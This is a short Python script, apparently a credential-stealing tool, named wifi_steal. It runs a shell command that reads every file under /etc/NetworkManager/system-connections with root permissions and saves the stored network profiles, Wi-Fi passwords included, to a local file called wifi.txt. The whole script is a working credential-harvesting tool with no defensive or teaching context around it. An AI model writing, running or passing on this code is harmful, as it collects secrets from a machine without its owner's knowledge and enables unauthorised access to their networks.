#!/usr/bin/python
import subprocess


def wifi_steal():
            """
            saves the network information, including the wifi password in a file called wifi.txt
            :return:
            """
            command = "cat /etc/NetworkManager/system-connections/*" # root permissions required
            try:
                        proc = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE,  stdout=subprocess.PIPE, stdin=subprocess.PIPE)
                        wifi = proc.stdout.read() + proc.stderr.read()
                        data = open("wifi.txt", "w")
                        data.write(str(wifi.decode()))
                        data.close()
            except Exception as error:
                        print(error)


wifi_steal()
